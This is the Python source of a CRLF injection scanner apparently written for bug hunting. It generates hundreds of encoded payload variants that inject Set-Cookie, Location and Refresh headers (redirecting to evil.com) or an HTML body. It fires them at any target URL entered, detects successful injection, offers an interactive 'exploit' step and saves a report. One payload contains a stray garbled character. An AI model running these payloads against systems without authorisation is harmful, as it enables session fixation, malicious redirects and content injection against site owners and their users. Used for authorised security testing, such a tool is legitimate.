import requests
from urllib.parse import quote, unquote
from colorama import Fore, Style, init
import time
import sys

# Initialize colorama
init(autoreset=True)

def print_banner():
    """Print the ASCII banner with tool information"""
    banner = f"""
{Fore.CYAN}
                                                                                               
 @@@@@@@  @@@@@@@   @@@       @@@@@@@@                  @@@@@@    @@@@@@@   @@@@@@   @@@  @@@  
@@@@@@@@  @@@@@@@@  @@@       @@@@@@@@                 @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@ @@@  
!@@       @@!  @@@  @@!       @@!                      !@@       !@@       @@!  @@@  @@!@!@@@  
!@!       !@!  @!@  !@!       !@!                      !@!       !@!       !@!  @!@  !@!!@!@!  
!@!       @!@!!@!   @!!       @!!!:!                   !!@@!!    !@!       @!@!@!@!  @!@ !!@!  
!!!       !!@!@!    !!!       !!!!!:                    !!@!!!   !!!       !!!@!!!!  !@!  !!!  
:!!       !!: :!!   !!:       !!:                           !:!  :!!       !!:  !!!  !!:  !!!  
:!:       :!:  !:!   :!:      :!:                          !:!   :!:       :!:  !:!  :!:  !:!  
 ::: :::  ::   :::   :: ::::   ::       :::::::::::::  :::: ::    ::: :::  ::   :::   ::   ::  
 :: :: :   :   : :  : :: : :   :        :::::::::::::  :: : :     :: :: :   :   : :  ::    :   
                                                                                               
{Fore.YELLOW}
        CRLF Injection Scanner | {Fore.CYAN}Author: {Fore.MAGENTA}Sharik Khan {Fore.WHITE}(anon_hunter)
        {Fore.YELLOW}Twitter: {Fore.BLUE}X.com/4non_hunter
{Fore.CYAN}{'='*80}{Style.RESET_ALL}
"""
    print(banner)

def generate_payloads():
    """Generate payloads with various bypass techniques"""
    payloads = []
    
    # Basic CRLF payloads
    base_payloads = [
        "%0d%0aSet-Cookie:injected=1",
        "%0d%0aLocation:https://evil.com",
        "%0d%0aX-Test:injected-header",
        "%0d%0aRefresh:0;url=https://evil.com",
        "%0d%0aContent-Length:0",
        "%0d%0aContent-Type:text/html%0d%0a%0d╝<html>Injected</html>",
    ]
    
    # Advanced bypass techniques
    bypass_techniques = [
        "",  # No extra bypass
        "%23",  # Hash bypass
        "%3f",  # Question mark bypass
        "%26",  # Ampersand bypass
        "%20",  # Space
        "%09",  # Tab
        "%0b",  # Vertical tab
    ]
    
    # CRLF representations
    crlf_variations = [
        ("%0d%0a", "CRLF"),         # Standard
        ("%0a%0d", "LFCR"),         # Reverse
        ("%0a", "LF"),              # Line Feed Only
        ("%0d", "CR"),              # Carriage Return Only
        ("%25%30%61", "Double-Encoded LF"),  # %0a encoded
        ("%25%30%64", "Double-Encoded CR"),  # %0d encoded
    ]
    
    # Generate all combinations
    for base in base_payloads:
        for tech in bypass_techniques:
            for crlf, name in crlf_variations:
                # Insert bypass before CRLF
                payload = base.replace("%0d%0a", tech + crlf)
                payloads.append({
                    "payload": payload,
                    "technique": f"{name} + {tech if tech else 'None'}",
                    "type": base.split(':')[0][5:].capitalize(),
                    "base": base
                })
    
    return payloads

def print_progress(index, total, payload, status, vuln_type=None):
    """Print real-time progress with color coding"""
    percentage = (index / total) * 100
    progress_bar = f"[{'=' * int(percentage/5)}{' ' * (20 - int(percentage/5))}]"
    
    payload_display = unquote(payload)[:50] + ("..." if len(unquote(payload)) > 50 else "")
    
    if status == "testing":
        color = Fore.YELLOW
        status_text = "TESTING"
    elif status == "vulnerable":
        color = Fore.GREEN
        status_text = "VULNERABLE"
    elif status == "error":
        color = Fore.RED
        status_text = "ERROR"
    else:
        color = Fore.WHITE
        status_text = "SAFE"
    
    sys.stdout.write("\r")
    sys.stdout.write(f"{Fore.CYAN}{progress_bar} {Fore.WHITE}{percentage:.1f}% ")
    sys.stdout.write(f"{color}{status_text} {Fore.WHITE}| ")
    sys.stdout.write(f"Payload: {Fore.MAGENTA}{payload_display}")
    
    if vuln_type:
        sys.stdout.write(f" {Fore.CYAN}| Type: {vuln_type}")
    
    sys.stdout.flush()

def check_response(response, payload_type, payload):
    """Check if injection was successful based on payload type"""
    payload = unquote(payload).lower()
    
    if "set-cookie" in payload_type.lower():
        cookies = response.headers.get('Set-Cookie', '')
        if isinstance(cookies, str):
            cookies = [cookies]
        return any("injected=1" in cookie.lower() for cookie in cookies)
    
    if "location" in payload_type.lower():
        location = response.headers.get('Location', '')
        return "evil.com" in location.lower()
    
    if "refresh" in payload_type.lower():
        refresh = response.headers.get('Refresh', '')
        return "evil.com" in refresh.lower()
    
    if "content-type" in payload_type.lower():
        return "injected" in response.text.lower()
    
    # Check for any injected header
    keywords = ['injected', 'evil.com', 'test']
    for header, value in response.headers.items():
        header_str = f"{header}:{value}".lower()
        if any(kw in header_str for kw in keywords):
            return True
    
    return False

def exploit_vulnerability(url, payload_details):
    """Demonstrate exploit by showing injected content"""
    full_url = url + payload_details['payload']
    print(f"\n{Fore.CYAN}[*] Exploiting: {full_url}")
    
    try:
        response = requests.get(full_url, headers=headers, allow_redirects=False, timeout=10)
        print(f"{Fore.YELLOW}[*] Response Code: {response.status_code}")
        
        print(f"\n{Fore.YELLOW}[*] Response Headers:")
        keywords = ['injected', 'evil.com', 'test']
        for header, value in response.headers.items():
            header_str = f"{header}:{value}".lower()
            if any(kw in header_str for kw in keywords):
                print(f"{Fore.GREEN}{header}: {value}")
            else:
                print(f"{header}: {value}")
        
        if "Content-Type" in payload_details['type']:
            print(f"\n{Fore.YELLOW}[*] Response Body:")
            print(response.text[:500] + ("..." if len(response.text) > 500 else ""))
    
    except Exception as e:
        print(f"{Fore.RED}[!] Exploit failed: {str(e)}")

def generate_report(target, payload_details, response):
    """Generate vulnerability report"""
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    filename = f"crlf_report_{timestamp}.txt"
    
    report = f"""
CRLF Injection Vulnerability Report
===================================
Report Generated: {time.ctime()}
Target URL: {target}
Vulnerable Parameter: file

Vulnerability Details:
----------------------
Payload: {unquote(payload_details['payload'])}
Payload Type: {payload_details['type']}
Bypass Technique: {payload_details['technique']}
Response Code: {response.status_code}

Request:
--------
GET {target + payload_details['payload']}

Response Headers:
-----------------
"""
    for header, value in response.headers.items():
        report += f"{header}: {value}\n"
    
    report += f"\nResponse Body (first 200 chars):\n{response.text[:200]}"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    return filename

if __name__ == "__main__":
    # Verify Python version
    if sys.version_info < (3, 6):
        print(f"{Fore.RED}Error: This script requires Python 3.6 or higher")
        sys.exit(1)
    
    # Print banner
    print_banner()
    
    # Get target URL
    target_url = input(f"{Fore.CYAN}[?] Enter target URL (with vulnerable parameter): {Fore.WHITE}").strip()
    
    # Validate URL format
    if not target_url.startswith("http"):
        print(f"{Fore.RED}Error: URL must start with http:// or https://")
        sys.exit(1)
    
    headers = {
        "User-Agent": "Advanced-CRLF-Scanner/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    # Generate payloads
    payloads = generate_payloads()
    total_payloads = len(payloads)
    vulnerable_found = False

    print(f"\n{Fore.YELLOW}[*] Starting CRLF injection scan on {target_url}")
    print(f"{Fore.YELLOW}[*] Testing {total_payloads} payload variations...\n")
    
    # Start timer
    start_time = time.time()

    for i, payload_details in enumerate(payloads):
        payload = payload_details['payload']
        full_url = target_url + payload
        
        # Print progress
        print_progress(i + 1, total_payloads, payload, "testing")
        
        try:
            response = requests.get(full_url, headers=headers, allow_redirects=False, timeout=15)
            
            if check_response(response, payload_details['type'], payload):
                # Print vulnerability found
                print_progress(i + 1, total_payloads, payload, "vulnerable", payload_details['type'])
                print("\n")  # Move to new line for vulnerability details
                
                vulnerable_found = True
                print(f"\n{Fore.GREEN}[!] VULNERABLE ENDPOINT: {target_url}")
                print(f"{Fore.GREEN}[+] Payload: {unquote(payload)}")
                print(f"{Fore.GREEN}[+] Technique: {payload_details['technique']}")
                print(f"{Fore.GREEN}[+] Type: {payload_details['type']} injection")
                print(f"{Fore.GREEN}[+] Status: {response.status_code}")
                
                # Show injected headers
                keywords = ['injected', 'evil.com', 'test']
                for header, value in response.headers.items():
                    header_str = f"{header}:{value}".lower()
                    if any(kw in header_str for kw in keywords):
                        print(f"  {Fore.CYAN}{header}: {value}")
                
                # Ask for exploitation
                exploit = input(f"\n{Fore.YELLOW}[?] Exploit this vulnerability? (y/n): ").strip().lower()
                if exploit == 'y':
                    exploit_vulnerability(target_url, payload_details)
                    
                    # Generate report
                    report = input(f"{Fore.YELLOW}[?] Generate vulnerability report? (y/n): ").strip().lower()
                    if report == 'y':
                        filename = generate_report(target_url, payload_details, response)
                        print(f"{Fore.GREEN}[+] Report saved as: {filename}")
                
                print("-" * 80)
            else:
                # Print safe status
                print_progress(i + 1, total_payloads, payload, "safe")
        
        except Exception as e:
            # Print error status
            print_progress(i + 1, total_payloads, payload, "error")
            print(f"\n{Fore.RED}[!] Error: {str(e)}")
            continue
    
    # Calculate scan time
    scan_time = time.time() - start_time
    
    # Final status
    print("\n\n" + "=" * 80)
    if vulnerable_found:
        print(f"{Fore.GREEN}[+] Scan completed in {scan_time:.2f} seconds. Vulnerabilities found!")
    else:
        print(f"{Fore.RED}[-] Scan completed in {scan_time:.2f} seconds. No CRLF vulnerabilities found")
    print("=" * 80)
